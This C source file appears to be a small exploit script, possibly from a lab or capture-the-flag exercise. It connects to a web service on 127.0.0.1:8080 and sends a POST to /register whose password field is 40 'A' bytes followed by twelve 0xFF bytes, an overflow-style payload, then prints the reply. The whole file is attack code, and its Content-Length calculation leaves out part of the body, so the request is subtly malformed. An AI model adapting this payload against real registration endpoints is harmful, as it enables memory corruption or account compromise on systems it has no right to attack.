#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define PORT 8080
#define BUFFER_SIZE 4096

int main() {
    int sock = 0;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE] = {0};

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Ошибка создания сокета");
        return -1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
        perror("Неверный адрес");
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Не удалось подключиться к серверу");
        return -1;
    }

    char payload[150] = {0};
    memset(payload, 'A', 40);
    strcat(payload, "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF");


    char post_request[512];
    snprintf(post_request, sizeof(post_request),
             "POST /register HTTP/1.1\r\n"
             "Host: 127.0.0.1\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: %lu\r\n"
             "\r\n"
             "username=%s&password=%s",
             strlen(payload) + 9,
             "admin",
             payload
    );

    send(sock, post_request, strlen(post_request), 0);

    int bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received < 0) {
        perror("Ошибка получения данных");
        return -1;
    }

    buffer[bytes_received] = '\0';
    printf("Ответ от сервера:\n%s\n", buffer);

    close(sock);
    return 0;
}